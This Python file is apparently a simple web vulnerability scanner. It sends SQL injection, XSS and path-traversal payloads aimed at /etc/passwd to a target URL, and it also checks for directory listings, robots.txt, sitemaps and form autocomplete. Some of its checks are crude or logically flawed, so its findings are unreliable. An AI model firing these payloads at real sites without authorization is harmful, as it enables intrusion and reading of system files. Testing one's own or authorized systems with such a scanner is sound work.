import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

def sqlInjectionErrorFunction(url):
    # initialize a session
    session = requests.Session()
    # set the User-agent as a regular browser
    session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

    # Correct Work
    sql_errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "query failed:",
        "warning</b>:  include(",
        "server error in '/' application",
        "You have an error in your SQL syntax",
        "MySQL server version for the right syntax to use near",
        "warning: require()",
        "warning: filesize()",
        "warning: filesize()",
        "warning: preg_match()",
        "warning: array_merge()",
        "warning: mysql_query()",
        "warning: mysql_num_rows()",
        "warning: mysql_result()",
        "arning: mysql_result()",
        "warning: mysql_result()",
        "warning: session_start()",
        "warning: unknown()",
        "warning: getimagesize()",
        "is_writable()",
        "getimagesize()",
        "session_start()",
        "mysql_num_rows()",
        "mysql_fetch_array()",
        "warning: mysql_fetch_assoc()",
        "warning</b>: include(news.php')",
        "'80040e21'</font>",
        "'80040e14'</font>",
        "'800a000d'</font>",
        "'800a0bcd'</font>",
        "'800a0d5d'</font>",
    }
    errorResult = ""
    sqli = "' or 1 --'"
    new_url = f"{url}{sqli}"
    print("[!] Trying", new_url)
    # make the HTTP request
    try:
        additional_res = session.get(new_url)
        # reference_res = session.get(url)
        # print(additional_res.reason)
        for error in sql_errors:
            if error in additional_res.content.decode().lower():
                print("[+] SQL Injection vulnerability detected, link:", new_url)
                errorResult = "Sql Injection Error"
                return errorResult
                # print("[+] SQL Injection vulnerability detected, link:", new_url)
            # elif additional_res.content.decode().lower() != reference_res.content.decode().lower():
            #     print("[+] SQL Injection vulnerability detected, link:", new_url)
            # else:
            #     print("No sqli error")
        return errorResult
    except:
        print("Failed to load url")
        return ""

def lfiErrorFunction(url):
    # initialize a session
    session = requests.Session()
    # set the User-agent as a regular browser
    session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

    # lfi_errors = {
    #     "root:/bin/csh",
    #     "user:/root:",
    #     "root:/bin/bash",
    #     "bin/false"
    # }
    indexOfIsEqualTo = url.index('=')
    url_substring = url[0:indexOfIsEqualTo]
    errorResult = ""
    check = False
    if check == False:
        lfi = "=/../etc/passwd"
        new_url = f"{url_substring}{lfi}"
        print("[!] Trying", new_url)
        # make the HTTP request
        try:
            additional_res = session.get(new_url)
            if "root:/bin/csh" in additional_res.content.decode().lower() or  "user:/root:" in additional_res.content.decode().lower() or "root:/bin/bash" in additional_res.content.decode().lower() or "bin/false" in additional_res.content.decode().lower():
                print("[+] LFI vulnerability detected, link:", new_url)
                errorResult = lfi
                check = True
                return errorResult
            
        except:
            print("Failed to load url")
    if check == False:
        lfi = "=../etc/passwd"
        new_url = f"{url_substring}{lfi}"
        print("[!] Trying", new_url)
        # make the HTTP request
        try:
            additional_res = session.get(new_url)
            if "root:/bin/csh" in additional_res.content.decode().lower() or  "user:/root:" in additional_res.content.decode().lower() or "root:/bin/bash" in additional_res.content.decode().lower() or "bin/false" in additional_res.content.decode().lower():
                print("[+] LFI vulnerability detected, link:", new_url)
                errorResult = lfi
                check = True
                return errorResult
            
        except:
            print("Failed to load url")
    if check == False:
        lfi = "=../../../../../etc/passwd"
        new_url = f"{url_substring}{lfi}"
        print("[!] Trying", new_url)
        # make the HTTP request
        try:
            additional_res = session.get(new_url)
            if "root:/bin/csh" in additional_res.content.decode().lower() or  "user:/root:" in additional_res.content.decode().lower() or "root:/bin/bash" in additional_res.content.decode().lower() or "bin/false" in additional_res.content.decode().lower():
                print("[+] LFI vulnerability detected, link:", new_url)
                errorResult = lfi
                check = True
                return errorResult
            
        except:
            print("Failed to load url")

    return errorResult

def xssErrorFunction(url):
    # initialize a session
    session = requests.Session()
    # set the User-agent as a regular browser
    session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

    errorResult = ""
    xss = "%22%3E%3Cimg%20src=x%20onerror=prompt%281%29%3E"
    xssOutput = "%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E"
    xssOutput1 = "\"><img src=x onerror=prompt(1)>"
    new_url = f"{url}{xss}"
    print("[!] Trying", new_url)
    # make the HTTP request
    try:
        additional_res = session.get(new_url)
        # reference_res = session.get(url)
        # print(additional_res.reason)
        # if "\\" in additional_res.content.decode().lower() or  url in additional_res.content.decode().lower():
        if xss in additional_res.content.decode().lower() or xssOutput in additional_res.content.decode().lower() or xssOutput1 in additional_res.content.decode().lower():
            print("[+] XSS vulnerability detected, link:", new_url)
            errorResult = xss
            # check = True
            return errorResult
        
        return errorResult
    except:
        print("Failed to load url")
        return ""

def directoryErrorFunction(url):
    # initialize a session
    session = requests.Session()
    # set the User-agent as a regular browser
    session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

    errorResult = ""
    print("[!] Trying", url)
    # make the HTTP request
    try:
        additional_res = session.get(url)
        # reference_res = session.get(url)
        # print(additional_res.reason)
        if "<title>index of" in additional_res.content.decode().lower():
            print("[+] Directory vulnerability detected, link:", url)
            errorResult = url
            return errorResult
        
        return errorResult
    except:
        print("Failed to load url")
        return ""

def clickJackingErrorFunction(url):
    # initialize a session
    session = requests.Session()
    # set the User-agent as a regular browser
    session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

    errorResult = ""
    new_url = url
    print("[!] Trying", new_url)
    # make the HTTP request
    try:
        additional_res = session.get(new_url)
        # reference_res = session.get(url)
        # print(additional_res.reason)
        if "<iframe" in additional_res.content.decode().lower():
            print("[+] Clickjacking in: ", new_url)
            errorResult = "iframe error"
            return errorResult
    except:
        print("Failed to load url")
    
    return errorResult

def robotTxtFunction(url):
    # initialize a session
    session = requests.Session()
    # set the User-agent as a regular browser
    session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

    errorResult = ""
    robotTxt = "/robots.txt"
    new_url = f"{url}{robotTxt}"
    print("[!] Trying", new_url)
    # make the HTTP request
    try:
        additional_res = session.get(new_url)
        # reference_res = session.get(url)
        # print(additional_res.reason)
        if "user-agent:" in additional_res.content.decode().lower():
            print("[+] Robot txt error in: ", new_url)
            errorResult = "Robot.txt"
            return errorResult
    except:
        print("Failed to load url")
    
    return errorResult

def siteMapXmlFunction(url):
    # initialize a session
    session = requests.Session()
    # set the User-agent as a regular browser
    session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

    errorResult = ""
    siteMap = "/sitemap.xml"
    new_url = f"{url}{siteMap}"
    print("[!] Trying", new_url)
    # make the HTTP request
    try:
        additional_res = session.get(new_url)
        # reference_res = session.get(url)
        # print(additional_res.reason)
        if "</loc></sitemap>" in additional_res.content.decode().lower() or "<loc>http:" in additional_res.content.decode().lower():
            print("[+] siteMap.xml in: ", new_url)
            errorResult = "sitemap.xml"
            return errorResult
    except:
        print("Failed to load url")
    
    return errorResult

def autoCompleteCheckerFunction(url):
    # initialize a session
    session = requests.Session()
    # set the User-agent as a regular browser
    session.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"

    errorResult = ""
    new_url = url
    print("[!] Trying", new_url)
    # make the HTTP request
    try:
        additional_res = session.get(new_url)
        # reference_res = session.get(url)
        # print(additional_res.reason)
        if "type=\"password\"" in additional_res.content.decode().lower() or "type=\"text\"" in additional_res.content.decode().lower() or "type=\"email\"" in additional_res.content.decode().lower() and "autocomplete= \"off\"" not in additional_res.content.decode().lower():
            print("[+] Autocomplete email & pass in: ", new_url)
            errorResult = "on"
            return errorResult
    except:
        print("Failed to load url")
        return ""
    
    return errorResult